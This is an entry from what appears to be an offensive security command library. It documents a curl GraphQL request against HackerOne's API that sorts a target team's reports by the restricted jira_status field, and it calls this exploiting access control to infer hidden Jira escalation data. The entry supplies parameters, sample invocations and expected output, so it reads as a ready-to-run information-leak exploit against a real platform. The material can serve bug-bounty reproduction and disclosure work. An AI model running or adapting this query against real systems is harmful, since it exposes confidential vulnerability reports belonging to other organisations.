---
id: cmd-graphql-jira-sort-001
name: graphql-query-reports-by-jira-status
type: command
executor: bash
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Authorization: Bearer
  YOUR_TOKEN" -H "Content-Type: application/json" -d '{"query": "{
  reports(where: {team: {handle: {_eq: \"team_handle\"}}}, order_by: {direction:
  ASC, field: jira_status}) { total_count nodes { substate jira_escalation_state
  jira_escalation_last_state_change_at created_at disclosed_at
  extracted_report_data { hosts } title url team { handle } reporter { username
  } } } }"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.232Z'
platforms:
  - Web
tags:
  - graphql
  - jira
  - sorting
verified: false
validated: true
submitted: true
---

# graphql-query-reports-by-jira-status

## Command

```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ reports(where: {team: {handle: {_eq: \"team_handle\"}}}, order_by: {direction: ASC, field: jira_status}) { total_count nodes { substate jira_escalation_state jira_escalation_last_state_change_at created_at disclosed_at extracted_report_data { hosts } title url team { handle } reporter { username } } } }"}'
```

## Description

This command queries HackerOne's GraphQL API for reports sorted by the restricted jira_status field, exploiting access control to reveal discrepancies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `YOUR_TOKEN` | Authentication bearer token | Yes |
| `team_handle` | Target team handle | Yes |
| `where` | Team filter | Yes |
| `order_by` | Sorting by jira_status ASC | Yes |
| `total_count` | Count of matching reports | Yes |
| `nodes` | Report objects, including null Jira fields | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Authorization: Bearer token123" -H "Content-Type: application/json" -d '{"query": "{ reports(where: {team: {handle: {_eq: \"test-team\"}}}, order_by: {direction: ASC, field: jira_status}) { total_count nodes { title } } }"}'
```

### Advanced Usage

Full fields for detailed analysis of nulls.

## Expected Output

JSON like: {"data":{"reports":{"total_count":11,"nodes":[{"title":"Report X","jira_escalation_state":null},...]}}}

## Related

- [[commands/graphql-query-reports-by-id]]
- [[procedures/Query-Reports-Ordered-by-Jira-Status]]
